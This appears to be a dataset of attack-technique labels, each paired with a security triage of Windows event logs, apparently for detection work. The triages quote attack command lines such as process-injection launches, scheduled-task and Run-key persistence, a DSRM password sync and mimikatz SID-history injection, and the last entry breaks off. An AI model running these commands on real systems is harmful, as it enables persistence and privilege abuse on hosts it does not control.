Thread Execution Hijacking,"### Analysis of Provided Logs

After a detailed analysis of the provided Windows event logs, there are concerning indicators potentially pointing towards malicious activity, particularly from the Windows PowerShell events and Sysmon logs.

#### Windows PowerShell Logs
The logs consistently show the following command being executed: 
```powershell
powershell.exe & {$notepad = Start-Process notepad -passthru
Start-Process ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.003\bin\InjectContext.exe""
Start-Sleep -Seconds 5
Stop-Process $notepad.id}
```
- **Suspicious Activity**: 
  - The use of PowerShell to launch processes can often indicate scripting for automation of legitimate tasks; however, in this context, it shows ""InjectContext.exe"" being executed from a temporary directory. This directory is atypical for legitimate binary execution which could indicate malware or a manual attack, often trying to evade detection by utilizing less monitored paths and temporary directories.
  - Execution of ""InjectContext.exe,"" especially lodged within a path containing ""file\data.003\bin,"" stands out as an abnormal use of PowerShell, suggesting possible code injection.

#### Sysmon Logs
- A suspicious process flow shows frequent usage of high privilege level with different system utilities (`whoami.exe`, `conhost.exe`) and overlaps with the execution of `InjectContext.exe`. The privilege escalation capabilities observed (e.g., `SeDebugPrivilege`) frequently coincides with malicious activity.
- The execution path of `InjectContext.exe` correlates well with suspicious PowerShell activity, further supporting malicious intent.

#### Security Log
- **Event 4672 (Special Privileges Assigned)**: Indicates administrative privileges known to be commonly leveraged for unauthorized escalation or information gathering.
- **Event 4624 (Logon Events)**: NTLM authentication indicates a possible internal system access, possibly local or network-based but legitimate frontend tools can sometimes be used for lateral movements.

### Assessment
The activity observed is **SUSPICIOUS** and needs further investigation. The combination of using PowerShell to execute unknown binaries, alongside pattern activities of privilege escalations and lack of proper parent process lineage, could indicate a potential compromise or an internal system exploitation by a threat actor. The logs suggest potential unauthorized usage or persistence establishing attempts using privilege escalation.

### Recommendations
Given these findings, follow this guidance:
1. **Isolate the System**: Immediately isolate ""Server002"" from the network to prevent any potential lateral movement.
2. **Memory Analysis**: Conduct an in-depth memory analysis of ""Server002"" to uncover any active malicious processes or connections related to `InjectContext.exe` or other suspicious powershell activities.
3. **Investigate Further**: Review all logs for other similar patterns across different systems, as the behavior might not be isolated to one workstation.
4. **Patch and Review**: Ensure the system is fully patched against known vulnerabilities exploited by similar threats, and conduct a thorough review of installed software for any suspicious items.
5. **User Identity Review**: Verify and audit the actions and credentials associated with ""admin_test"", ensuring no unauthorized access or accounts have been established.

The evidence points to a non-benign situation that demands immediate attention to prevent any potential compromise escalation or data exfiltration, therefore further investigation is required to confirm suspicion and clarify the nature of the threat."
Dirty Vanity process Injection,"Based on the log entries provided, an in-depth analysis has been performed focusing on potential indicators of malicious activity such as unusual process execution, command-line arguments, and privilege escalation. Here's the breakdown of notable events and suspicious activities:

### Analysis:

1. **PowerShell Activity:**
   - The PowerShell logs indicate a suspicious activity where a PowerShell script is used to run an executable located in a temporary user directory (`\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\x64\\redVanity.exe`). This is followed by the execution of `calc.exe`. The use of temporary directories and chaining PowerShell commands in this manner is often indicative of malicious behavior, such as malware or a penetration testing tool. 

2. **Sysmon Events:**
   - Sysmon logs show the creation of several processes, including `wevtutil.exe`, `svchost.exe`, `conhost.exe`, `whoami.exe`, and `calc.exe`. The sequence aligns with the suspicious PowerShell command that executed `redVanity.exe`, and then `calc.exe`.
   - The executable path for `redVanity.exe` and its pattern suggests it is potentially malicious, especially given the context of temporary file execution and privilege use.
  
3. **Security Log Insight:**
   - A notable event is the logon of a user `admin_test` with elevated privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.). This can be a routine event, but combined with the execution of suspicious PowerShell scripts and unusual process activities, it raises concerns about potential privilege misuse.

4. **Timestamp and Time Change Entries:**
   - There are entries relating to time changes executed by `svchost.exe`. While time changes alone are not unusual, tied with suspicious activities, it could indicate attempts to evade detection or confuse time-based log analysis.

### Conclusion:

The combination of the above findings, particularly the execution of a PowerShell script running a potentially malicious executable from a temporary path, where users typically do not execute legitimate applications, raises red flags. The presence of process executions and elevated privileges coincides with typical behaviors associated with initial access or execution phases of a cyber-attack.

### Resolution:

- **MALICIOUS:** There is substantial evidence to suggest that the PowerShell activity involving the execution of `redVanity.exe` is not legitimate and has characteristics of being an unauthorized or malicious activity. Further immediate investigation and response actions are recommended to isolate the threat, such as:
  - Quarantining the affected host (Server002)
  - Conducting a detailed forensic analysis on the related PowerShell script and executable
  - Reviewing user activities associated with `admin_test` for anomalies and potential unauthorized access
  - Enhancing monitoring for similar patterns across the network."
Process injection ListPlanting,"After analyzing the provided logs, here's a detailed breakdown of the findings:

### Analysis:

1. **Suspicious PowerShell Activity:**
   - Multiple instances of PowerShell execution are observed with the command line execution that includes the use of `Start-Process`, execution of a file from a temporary directory, and use of `Get-Process` in conjunction with `Stop-Process` to terminate Notepad:
     ```
     powershell.exe & {Start-Process \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.015\\bin\\ListPlanting.exe\"" Start-Sleep -Seconds 7 Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force}
     ```
   - This behavior is indicative of potential malicious activity. The use of temporary directories for executable storage and execution, especially in conjunction with attempts to terminate system processes, is a red flag.

2. **Unusual Process Execution:**
   - The process `ListPlanting.exe` running from a `Temp` directory is unusual and could indicate a suspicious or unauthorized operation.
   - The termination of the Notepad process via PowerShell without clear reason could be interpreted as an attempt at covering tracks or disrupting user activity.

3. **Elevated Privileges:**
   - Security log entries show multiple elevation privileges granted to the `admin_test` user:
     ```
     SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege
     ```
   - Such privileges grant significant access, potentially allowing system manipulation. While not conclusive of malicious intent alone, coupled with other suspicious behaviors raises concerns.

4. **Edge Update Activity:**
   - Several events show the execution of Edge update installer processes. These appear standard and align with regular updating processes. However, the timing and occurrence of this activity may need further correlation with other events for anomaly detection.

### Assessment:

Based on the collected event logs and observed behaviors, there are strong indications of potential malicious activity, particularly around the PowerShell executions and temporary directory operations. The use of PowerShell scripts to execute binaries from temporary directories, coupled with elevated privileges, is a combination frequently associated with adversarial actions.

### Conclusion:

**Resolution:** SUSPICIOUS

### Guidance on How to Proceed:

1. **Immediate Response:**
   - Quarantine the affected host (Server002) to prevent further network communication while investigations are underway.
   - Perform a comprehensive malware scan on the host to identify and remove potentially malicious software.

2. **Further Investigation:**
   - Review additional logs, especially those related to network communication and file system changes, to track any data exfiltration attempts or further malicious activity.
   - Correlate any identified indicators with known threat actor behaviors or ongoing threat intelligence.

3. **Long-term Actions:**
   - Implement enhanced monitoring on the network to flag unusual credential usage or application execution patterns.
   - Conduct a review of user privileges, ensuring principle of least privilege is enforced to minimize potential damage in case of similar future incidents."
Parent PID Spoofing - Spawn from Specified Process,"Based on my analysis of the provided Windows event logs, here's a detailed breakdown of my observations:

### System Log
The entries in the System log primarily contain updates via the Windows Update Client, which are routine system events for updating applications like Microsoft.WindowsCamera and Microsoft.YourPhone. No anomalies or unexpected behavior associated with malicious activities were detected here.

### Application Log
The Application log was not provided with detailed content, hence no analysis can be performed for this section.

### Windows PowerShell Log
The PowerShell logs show two notable activities:
1. Execution of a command which includes `Start-ATHProcessUnderSpecificParent -ParentId $PID -TestGuid...`, which appears to be a custom or specific testing script. This can be suspicious if this command is unexpected or unauthorized, as it suggests process manipulation, which can be a tactic in malware operations.
2. Another command executed with PowerShell is used with the `-ExecutionPolicy Restricted` flag, checking `.inf` files for certain patterns commonly seen in installation scripts. While this activity can be part of routine system management or testing, its appearance alongside the previously mentioned command raises concerns about unintended or unauthorized script execution.

### Security Log
The Security log contains a series of event ID 5379 entries related to credential fetching attempts, all resulting in failure with ReturnCode 3221226021, indicating an access failure or a similar issue. However, there is a successful logon (event ID 4624) for the SYSTEM account, followed by a typical set of privileges being assigned (event ID 4672), such as SeDebugPrivilege and SeImpersonatePrivilege, which are standard for SYSTEM accounts.

### Sysmon Log
Several processes are logged in the Sysmon logs, including the execution of common Windows utilities like `conhost.exe`, `whoami.exe`, `hostname.exe`, and frequent use of `powershell.exe`. A notable event is the execution of `CompatTelRunner.exe`, which is a legitimate telemetry application. However, compatibility telemetry tools can sometimes be exploited; hence, frequent entries of this process should be investigated if unexpected or unplanned telemetry tasks occur.

### Assessment

- **Suspicious Activities:**
  - The PowerShell execution involving custom scripts and process transitions is non-standard and demands further scrutiny. If such a script's purpose is unknown to system management or expected operations, it could indicate an attempt to disguise or escalate privileges stealthily.

- **Normal Routine Activities:**
  - The Windows Update operations and the presence of legitimate system processes being updated or running background tasks don't raise immediate concern for malicious activities.

### Recommendation

Given the context and nature of the suspicious PowerShell commands noted, the overall resolution of the logs at this stage is **SUSPICIOUS**. It is recommended to follow up with:
- Verification of the legitimacy and purpose of the specific PowerShell scripts and their origins. 
- Validation with any system administrators or application owners if the observed scripts are part of approved operations or routine updates.
- Enhanced monitoring of similar PowerShell activities on this host to track any significant deviations or potential risks.

Ensure these activities are validated against known safe baselines or involvement from trusted personnel. If these activities are unauthorized, consider a more comprehensive forensic investigation into potential unauthorized access or malicious software presence."
Driver Installation Using pnputil.exe,"After analyzing the provided logs from the Windows event logs, here's a detailed breakdown:

### Analysis:

1. **Sysmon Logs**:
   - The Sysmon logs show multiple seemingly benign processes such as `hostname.exe`, `conhost.exe`, `whoami.exe`, and Microsoft Edge Update-related processes like `MicrosoftEdgeUpdate.exe`, `pnputil.exe`.
   - A notable command in Sysmon logs is the execution of `powershell.exe` with the argument `{pnputil.exe -i -a C:\Windows\INF\acpipmi.inf}`. This operation is related to the addition of driver packages. It could be legitimate if conducted by an admin for maintenance or driver update but can look suspicious without a known maintenance context.
   - The parent processes and user context suggest these activities were initiated by a user `admin_test` with high integrity level privileges.

2. **PowerShell Logs**:
   - The PowerShell logs confirm the execution of `pnputil.exe`, reflecting the same as seen in Sysmon logs. The action seems focused on driver management, typically related to administrative tasks.

3. **Security Logs**:
   - A `4624` logon event indicates the user `admin_test` logging onto the system with NTLM authentication.
   - A `4672` event follows the logon, suggesting the assignment of high-level privileges (such as SeDebugPrivilege, SeBackupPrivilege, etc.) to the `admin_test` user. This shows an elevated privilege session which might be part of regular admin duties, but can also be potentially risky if not expected.

4. **Application Logs**:
   - The application logs show operations related to Microsoft Edge Update but no significant anomalies or errors related to application operations. The ""Service stopped"" logs show Edge Update service operations, likely normal.

### Assessment:
**Suspicious Activities Noticed:**
- **Use of PowerShell with Driver INF File**: The use of PowerShell to invoke `pnputil.exe` for driver installation via a command line is notable. This isn't malicious by itself but is something typically aligned with system configuration tasks which should be verified with administrative maintenance schedules.

**Risks/Threats:**
1. **Potential Misuse of Elevated Privileges**: Any unexpected elevation can become a target for misuse.
2. **Questionable PowerShell Command Execution**: Although this can be a legitimate activity, it requires confirmation with the system's intended configuration changes or updates.
   
**Guidance:**
- Cooperating with IT staff to check if they initiated or expected these command line activities involving `pnputil.exe` and the exact purpose.
- Verifying administrative logs or change management records to ensure there was an authorized schedule for such executions.

### Resolution:
- **SUSPICIOUS**: Although no definitive malicious activities are evident, the use of PowerShell to install a driver and the corresponding elevated privileges taken by `admin_test` require further investigation. It warrants verification with intended administrative actions and user privileges."
Launch NSudo Executable,"Upon careful analysis of the provided logs, the following observations can be made:

### Security Log Analysis:
- **Event ID 5379**: This series of events indicates Credential validation attempts that are unsuccessful (`Return Code: 3221226021`). The target names like `MicrosoftAccount:user=02txoixylodcstop` and `WindowsLive` tokens are being accessed but returning a code that indicates a failure or denied access. Such failed validation attempts are common and not inherently suspicious unless there are patterns indicative of a brute-force or unauthorized access attempt.
- **Event ID 4798**: This event records a series of enumerations of user accounts like `Administrator`, `admin_test`, `Guest`, and more executed by `taskhostw.exe`. Enumeration itself is not malicious but it shows that there's some form of account listing activity, likely done by a process.

### PowerShell Log Analysis:
- **PowerShell Event**: Observations reveal that there was an execution of `NSudoLG.exe` with elevated permissions arguments `-Argument \""-U:T -P:E cmd\""`. NSudo is a legitimate tool used to elevate process privileges on Windows. However, its usage is often scrutinized in security assessments for malware or unauthorized administrator actions because it can be misused to gain high-level privileges.

### Sysmon Log Analysis:
- **Process Creation**: The logs indicate various legitimate processes like `svchost.exe`, `HOSTNAME.EXE`, `whoami.exe`, `CONHOST.EXE`, and more running on the system by different users including `NT AUTHORITY\SYSTEM` and `SERVER002\admin_test`.
- **Microsoft Edge Installer**: The creation of processes related to updating Microsoft Edge seems legitimate as it includes `MicrosoftEdgeUpdate.exe` running as `NT AUTHORITY\SYSTEM`. There’s no indication of these actions being anomalous.

### Application Log Analysis:
- **Windows Defender**: The security product state being on indicates that Windows Defender is active, which is a good practice for malware defense. There's no indication of a security product being disabled that could hint at a compromise.

### Conclusion
The presence of `NSudoLG.exe` being used for privilege escalation is concerning and typically warrants further investigation, as it can be used to bypass security mechanisms on Windows. The enumeration of user accounts is also slightly out of place but not necessarily malicious.

### Assessment
- **SUSPICIOUS** - While the enumeration activities and execution of `NSudoLG.exe` are not conclusively malicious, they are suspicious, especially on a server. It's recommended to investigate further:
  - Verify if the usage of `NSudoLG.exe` is authorized and for legitimate purposes.
  - Analyze account enumeration activities to determine if they match authorized administrative actions.
  - Check for any unauthorized changes or file access patterns, particularly related to privileged activities.

Further actions should include reviewing user privileges, checking for any misconfigurations, and confirming the integrity of the affected systems."
Scheduled Task Startup Script,"### Analysis:

Upon reviewing the provided event logs, several events stand out, with a focus on the `Sysmon` logs.

#### 1. **Launching of `wevtutil.exe` and `conhost.exe`:**
   - Frequent launching of `wevtutil.exe` and `conhost.exe` is observed. While `wevtutil.exe` is a legitimate Windows utility for managing event logs, repeated quick succession and combination with `conhost.exe` may warrant further investigation into the context of these actions.
   
#### 2. **Execution of `cmd.exe` with suspicious scheduled task creation:**
   - The command line `cmd.exe /c schtasks /create /tn ""data_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe"" & schtasks /create /tn ""data_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""` is attempted.
   - This command line details the creation of two scheduled tasks that run Calculator (calc.exe) on login and startup. While Calculator is not inherently malicious, the behavior of creating scheduled tasks in this manner is often indicative of an attack pattern, typically used for persistence mechanisms or testing.

#### 3. **`whoami.exe` and `hostname.exe` execution:**
   - `whoami.exe` and `hostname.exe` are executed. Both are standard utilities for querying the current user and system hostname. These executions alone are benign but, depending on context, they might indicate reconnaissance activity.

### Assessment:

The logs reveal actions that are potentially indicative of suspicious behavior. The creation of scheduled tasks running on system events like user logon and system startup, even with a benign application like calc.exe, is typically suspicious as it can signal a method for persistence or configuration testing by an unauthorized user.

### Threats/Risks Identified:
- Potential misuse of scheduled tasks as a persistence mechanism.
- Usage of administrative-like actions through an account `SERVER002\\admin_test`.

### Guidance & Next Steps:
1. **Further Investigation:**
   - Review any corresponding Security Event Logs for new user accounts or privilege escalations.
   - Analyze any alerts from antivirus or endpoint monitoring solutions for anomalies linked with these timeframes.
   
2. **Security Monitoring:**
   - Monitor the system for further scheduler modifications or unauthorized commands.
   - Ensure enhanced scanning for malware for any system that exhibited the suspicious schtasks activities.

3. **Incident Response:**
   - If not already in place, restrict access and audit controls to sensitive commands and utilities.
   - Engage with the user `SERVER002\\admin_test` to confirm if these actions were intentional or sanctioned.

### Conclusion:

**Resolution: SUSPICIOUS**

The logs indicate suspicious activities mainly surrounding the creation of scheduled tasks that necessitate further investigation to understand the intent and origin of these actions. This conclusion warrants additional scrutiny to either confirm a benign use case or uncover potentially malicious intent."
Password Change on Directory Service Restore Mode (DSRM) Account,"Upon examining the provided logs, there are a few points to address regarding potentially suspicious activities:

1. **Frequent Use of Utilities**: There are multiple instances where `wevtutil.exe` and `conhost.exe` are executed together:
   - This could indicate log querying or clearing activities. `wevtutil.exe` is a legitimate tool for managing Windows event logs, but its use might be suspicious if not expected, especially repetitively in a short time frame.

2. **`cmd.exe` Execution with `ntdsutil`**:
   - An entry shows `cmd.exe` running with `ntdsutil` using the command `""cmd.exe"" /c ntdsutil ""set dsrm password"" ""sync from domain account %username%"" ""q"" ""q""`.
   - `ntdsutil` is a command-line tool that provides management of Windows Active Directory. The specific usage to reset a DSRM (Directory Services Restore Mode) password could be potentially dangerous if not a planned administrative action, as it might indicate an attempt to maintain persistence or escalate privileges by altering sensitive directory service settings.

3. **Time Changes**:
   - There are multiple time synchronization events (`EventID: 4616`) noting different times being set within a quick succession. 
   - While time synchronization itself is not unusual, rapid changes in a short period might imply an attempt to obscure activity timelines.

4. **High Privileges Granted**:
   - The user `SERVER002\admin_test` was granted a range of privileges including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc., which are high-level privileges that could be used maliciously if control is maintained by a non-legitimate user.

5. **New Process Events with Sensitive Command-Line Arguments**:
   - Hostname and Whoami commands executed with a high integrity level by the `admin_test` user might imply reconnaissance activity, commonly a precursor to further actions like privilege escalation or data exfiltration.

Considering these points, the activities noted in the logs may not conclusively indicate a compromise by themselves but are indeed unusual and could potentially be part of a malicious pattern, especially when involving administrative tools and high privileges.

### Assessment and Resolution:

- **Resolution**: **SUSPICIOUS** 

  **Guidance on How to Proceed**:
  - Review and confirm the `wevtutil.exe` and `ntdsutil` usage with legitimate IT staff to ensure these were expected actions.
  - Check for any scheduled tasks or scripts that might explain the logged actions.
  - Conduct a deeper investigation into the `admin_test` account activities and access patterns. Verify if the privileges assigned were routine or exceptional.
  - Ensure that the system's logs are being aggregated and protected against tampering.
  - Monitor for any signs of lateral movement or attempts at privilege escalation.
  - Engage security teams to further scrutinize network activity and coordinate a potential response plan if unauthorized actions are confirmed."
Injection SID-History with mimikatz,"Upon analyzing the provided Sysmon logs, we can discern the following activities and their potential implications. Below is a detailed assessment:

1. **Execution of Cmd.exe and Mimikatz.exe:**
   - The first event (EventID 1) shows the execution of `cmd.exe` with a command-line argument indicative of Mimikatz (`mimikatz.exe`), a well-known post-exploitation tool. The command-line suggests the user intended to execute Mimikatz, which is frequently used for credential extraction and unauthorized privilege escalation. This is a significant red flag and a strong indicator of potential malicious activity.

2. **High Integrity Level and User Context:**
   - The process is run with a high integrity level, by the user `SERVER002\\admin_test`, which suggests it has administrative privileges, enhancing the potential impact if this execution is part of a malicious action.

3. **Process Ancestry and Execution Context:**
   - The parent process of this `cmd.exe` execution is `powershell.exe`, used to check the presence of Mimikatz, and ultimately execute it. PowerShell is a powerful tool often used by adversaries due to its scripting capabilities and native presence in Windows systems, making detection and execution easier.

4. **Command Execution on Hostname and Whoami:**
   - Events also record `hostname.exe` and `whoami.exe` executions, common commands used to retrieve system and user information. While these can be benign in isolation, when coupled with other suspicious activities, they provide context about reconnaissance actions on the system.

5. **Numerous Instances of Wevtutil.exe:**
   - The frequent and rapid invocation of `wevtutil.exe`, a command-line utility for managing event logs, in this context is suspicious. Attackers often clear or manipulate event logs to cover their tracks. Combined with the other suspicious activities, this raises further concerns.

6. **Logs Suggesting Persistence or Privilege Gains:**
   - The command involving Mimikatz appears to aim for privilege elevation (`privilege::debug`) and modifying security identifiers (`sid::patch` and `sid::add`). This suggests attempts to establish persistence or escalate privileges illegitimately.

Based on the observed behaviors in the logs, specifically the execution chain involving `mimikatz.exe`, the presence of administrative privileges, and activity that aligns with common attack vectors (like clearing logs and reconnaissance), the overall assessment is:

**Resolution: MALICIOUS**

### Guidance on How to Proceed:
- **Immediate Response:**
  - Isolate the affected host to prevent further lateral movement or data exfiltration.
  - Conduct a comprehensive endpoint scan for other kits of similar nature or additional signs of compromise.
  - Change all administrator credentials tied to the server and invalidate current sessions.

- **Forensic and Incident Assessment:**
  - Collect and preserve evidence for detailed forensic analysis.
  - Review configurations and access logs to identify how the initial execution of malicious scripts occurred.
  - Thoroughly investigate user account activity, specifically, `admin_test`.

- **Mitigation Steps:**
  - Apply relevant Windows patches and security updates.
  - Ensure event logs are monitored for similar activity across the network.
  - Educate staff on identifying phishing attempts and risks associated with unauthorized software.

By following these recommended actions, you can not only mitigate the current threat but also strengthen your security posture against future intrusions."
Create a new time provider,"Upon reviewing the provided logs, several points indicate activities typically associated with unauthorized or malicious behavior. Here's a breakdown of the critical observations:

### Suspicious and Anomalous Behavior:

1. **PowerShell Activity:**
   - There are multiple PowerShell execution events indicating an operation to stop the Windows Time Service (`w32time`), copy a file (`fileTest.dll`) from a temporary directory to a public directory, and modify the registry to add a new time provider.
   - This action is suspicious due to:
     - Copying and registering a new DLL, especially from a non-standard directory (`C:\Users\Public`), which could indicate an attempt to introduce a malicious component into the system.
     - Modifying the `W32Time` service configuration is atypical for regular operations and could signify an attempt to maintain persistence or alter system time settings for malicious reasons.

2. **Time Service Errors:**
   - The `Microsoft-Windows-Time-Service` entry reports a failure to load the newly added time provider (`fileTest`), citing a missing module error. This may correlate with the PowerShell script's activities and suggests potential tampering or a failed attempt at persistence.

3. **Sysmon and Security Logs:**
   - Processes such as `reg.exe` are being used to modify registry settings. The PowerShell commands and subsequent registry changes are executed under the account `SERVER002\admin_test`, indicating possible misuse of administrative privileges. 
   - Use of network utility executables (`net.exe` and `net1.exe`) to stop and start Windows services, which may also align with the operational need to bypass permissions temporarily.
   - Event ID 4616 shows a time change, further aligning with behaviors seen in timestamp obfuscation tactics often used in evasion techniques.

4. **EdgeUpdate Process Activity:**
   - A large volume of EdgeUpdate processes (`MicrosoftEdgeUpdate.exe`) is being executed with various command-line arguments. Although these could represent routine update operations, the timing and quantity, synchronized with other suspicious activities, might warrant further investigation.

### Assessment:

Given the observed activities, particularly the unauthorized and suspicious PowerShell script execution aiming to change system files and registry settings, this environment shows a potential compromise or unauthorized tampering attempt. The use of administrative functions and modification of system services is often indicative of someone attempting to perform actions that could permit future malicious activities or control over the host environment.

### Resolution

- **MALICIOUS**: The series of actions executed, including suspicious PowerShell activity, unauthorized registry modifications, and service manipulations, all suggest definite malicious intent or an ongoing attack.

### Recommended Next Steps:

1. **Immediate Isolation of the Host**: Prevent further spread or execution of suspicious actions by isolating Server002 from the network.
2. **Malware Scanning**: Execute a deep malware scan to detect any malicious software or scripts installed on the system.
3. **Forensic Analysis**: Perform a thorough analysis to confirm the contents and origin of `fileTest.dll` and other executables listed.
4. **Review User Activity**: Audit the `admin_test` user account for unauthorized access or deviations from usual activity patterns.
5. **System Integrity Checks**: Validate the integrity of critical system components and reassess all recent changes made to the system, particularly to service configurations and the registry.
6. **Logging and Monitoring Enhancement**: Increase the level of monitoring, particularly for PowerShell, system events, and network connections, to detect and prevent further suspicious activities."
Process Injection with Go using UuidFromStringA WinAPI,"After analyzing the provided Windows event logs, the following points stand out that may indicate suspicious activities:

1. **Time Change Events:**
   - The `Microsoft-Windows-Kernel-General` logs (Event ID: 1, 24, etc.) and `Microsoft-Windows-Security-Auditing` logs (Event ID: 4616) clearly indicate that there have been changes made to the system time. Such changes are often an indication of attempts to obfuscate activities that have specific timestamps, such as malware execution or unauthorized access events.

2. **PowerShell Activity:**
   - The `Windows PowerShell` logs show that a PowerShell session was initiated with the execution of an executable file, `UuidFromStringA.exe`, from a temporary directory. Executables running from temporary directories using PowerShell can be a red flag for potential malicious activity. Especially, the command-line usage of PowerShell to run an executable with `-debug` arguments in a directory path indicative of temporary or transient usage suggests attempts to execute potentially harmful code in a manner that isn't typical for user-initiated processes.

3. **Sysmon Logs:**
   - Multiple different processes like `wevtutil.exe`, `whoami.exe`, `HOSTNAME.EXE`, and others have been executed in a very close time frame, all executed by the same user (`SERVER002\\admin_test`) with high integrity levels. While the use of `whoami.exe` and `hostname.exe` isn't inherently suspicious, they are typically used for information gathering and could be part of a sequence of activities by an intruder or malware.

4. **Scheduled network and system services started:**
   - The presence of multiple `svchost.exe` processes and `MicrosoftEdgeUpdate.exe` running shortly after the temporal adjustment and PowerShell activities can be construed as normal scheduler tasks. However, it's crucial to ensure the context in which these processes are running aligns with expected system behavior during that period.

**Assessment:**
- The logs contain several potential red flags, including time changes, anomalous PowerShell execution, and rapid process generation, which could be associated with malicious activities or post-exploitation phases of a cyber attack. These indicators are enough to warrant further investigation.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- Conduct a more in-depth analysis of the UuidFromStringA.exe to verify its origin and purpose. Check for known indicators of compromise (IOCs) and consider using a malware analysis sandbox.
- Review any additional logs and system state around the same timeframe for other anomalies not captured in this dataset.
- Verify the modification of system time settings and check for any unauthorized administrative actions on Server002.
- Run a thorough virus and malware scan on the server to catch any stealth processes or files.
- Monitor outgoing traffic and review any insider access to sensitive directories/credentials that may have been compromised during this period.

This determination suggests activity that is not normal and deserves further investigation to rule out potential threats to the system."
"Scheduled Task (""Ghost Task"") via Registry Key Manipulation","In analyzing the provided event logs, the focus is on identifying unusual activity, such as atypical process executions or suspicious command-line arguments that may indicate malicious activity. Here's a breakdown of the logs:

### Application Log
- The logs indicate Windows Defender is on, which is a positive security indication. No suspicious activity is recorded here.

### Sysmon Log
The Sysmon logs are detailed and primarily show process creations. Key observations include:
1. **PowerShell Execution**: 
   - PowerShell is executed by the user `SERVER002\admin_test`. The use of PowerShell can be benign, but without context or specific commands, this execution alone is not inherently suspicious.

2. **Cmd.exe Execution**:
   - The command line associated with `cmd.exe` execution shows usage of `PsExec.exe`, which can be used for remote command execution, and `GhostTask.exe`, potentially to add tasks.
   - Running `PsExec` (`-accepteula -s`) indicates elevated privileges, which is often used by attackers to gain persistence or execute commands remotely.

3. **Processes Associated with System Tools**:
   - Multiple executions of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe`. While these are legitimate Windows utilities, their frequency and combination suggest they may be part of a script or tool suite being run.
   
4. **Microsoft Edge Update Activity**:
   - The logs show multiple process executions related to updating Microsoft Edge. These processes are run by `NT AUTHORITY\SYSTEM` which is typical for system-level operations.

### Assessment
- **Suspicious Activity**: The usage of `PsExec.exe` and `GhostTask.exe` with `cmd.exe` and elevated privileges by a user account, `SERVER002\admin_test`, warrants investigation. While `PsExec` can be used legitimately, it is also a popular tool for lateral movement and execution of malicious tasks.

- **Benign Activity**: Typical system or application updates (like Microsoft Edge) and Windows Defender reporting appear normal and not indicative of compromise.

### Conclusion
The presence of `PsExec` and `GhostTask` in the command line arguments suggests this activity should be further investigated. It is not definitively malicious without knowing the intention or context of these commands, but such tools can be indicative of a compromise or attempted privilege escalation.

### Resolution
**SUSPICIOUS - if logs contain activity that doesn't look right and needs more investigation**

### Guidance on How to Proceed
1. **Investigate `admin_test` Activity**: Examine the user's activities, specifically focusing on the reasoning and legitimacy behind the use of `PsExec` and `GhostTask`.
   
2. **Check for Known Indicators of Compromise (IoCs)**: Inspect system files and configurations for unauthorized changes or known malicious signatures.
   
3. **Review Security Policies**: Ensure proper logging and alerting are in place for the use of administrative tools like `PsExec`.

4. **User and Host Monitoring**: Increase monitoring of this user account and host for any further suspicious activities."
HKCU - Policy Settings Explorer Run Key,"Upon reviewing the provided logs, here's the analysis by log type:

### System Log:
- **Kernel-General EventID 24 and 1**: These events refer to system time changes. The entries indicate system time was slightly adjusted, which is typically routine when syncing with an NTP server (""time.windows.com""). 
- **Time-Service EventID 35**: This event confirms time synchronization with a legitimate Microsoft NTP server.

### Sysmon Log:
- **Sysmon EventID 1**: Processes like `whoami.exe` and `hostname.exe` are standard system utilities used to retrieve information about the current user and hostname, respectively. Their execution under the `admin_test` account with high integrity isn't inherently suspicious but indicates that someone might be profiling the system.
- **Windows PowerShell Execution**: A `powershell.exe` process executed a command modifying the Windows Registry to create a new startup entry pointing to `calc.exe`. While `calc.exe` is harmless, this kind of modification could indicate a test of persistence mechanisms often observed in malicious activities.
- **Process Execution Using `wevtutil.exe`**: Frequent execution of `wevtutil.exe` might suggest event log manipulation, which could be an evasion technique. However, without further context, this alone doesn't confirm malicious intent.

### Security Log:
- **Security-Auditing EventID 4616**: These events reflect the changes to the system time, aligning with the system log entries. Generated by `svchost.exe`, which is legitimate for a process managing Windows services.

### Application Log:
- **Security-SPP EventID 16384**: This entry records the start of the Software Protection Service, ensuring system integrity against software tampering, which appears routine.

### Windows PowerShell Log:
- The log denotes the execution of a PowerShell script affecting the startup registry path. This action is potentially suspicious as typically used by malware to achieve persistence. The inclusion of `calc.exe` (a benign executable) suggests this script might be a test or could aim to conceal malicious intentions.

### Assessment:
The presence of routines like `whoami.exe`, along with registry manipulations via PowerShell to set a startup entry for `calc.exe`, raises suspicion. It indicates possible preparation for system profiling or persistence tests. No evidence shows complete system compromise, but the actions potentially align with a proof of concept or early-stage attack preparations.

### Conclusion:
- **Resolution**: **SUSPICIOUS**
- **Recommendations**:
  1. Further investigation is recommended, specifically into actions performed by the `admin_test` user and why the registry was modified using PowerShell.
  2. Ensure endpoint protection and conduct a review of registry changes.
  3. Monitor for further suspicious activity involving registry changes or unauthorized access attempts.
  4. Educate users on the dangers of running unauthorized scripts or executables.

The logs provide grounds to suspect unauthorized or potentially harmful actions, warranting a more comprehensive security evaluation."
Admin Account Manipulate,"**Analysis of Event Logs:**

### System Log:
- **Time Adjustment**: Multiple events related to time changes (EventID: 24 and 1) indicate a timezone adjustment or synchronization of time with a time source. This behavior looks benign as it is generally performed by `svchost.exe` as part of the normal Windows time synchronization process.

### Sysmon Log:
- **Process Execution**:
  - There are several instances of `wevtutil.exe` and `conhost.exe`. These are common Windows utilities, often used for legitimate purposes. Their presence alone does not indicate malicious activity.
  - **HOSTNAME.EXE and WHOAMI.EXE**: Both are standard Windows utilities used to check the system's hostname and the current logged-in user, respectively. This could be a benign activity or part of a larger task or script executed by an admin user.

- **PowerShell Execution**: The execution of PowerShell with a complex command line stands out:
  - **Command Analysis**: The PowerShell command is creating random variables and iterating over local administrative accounts, renaming them. This script is suspicious as it reflects an attempt to alter user account attributes, notably renaming an account that might impact account tracking and auditing.

### Security Log:
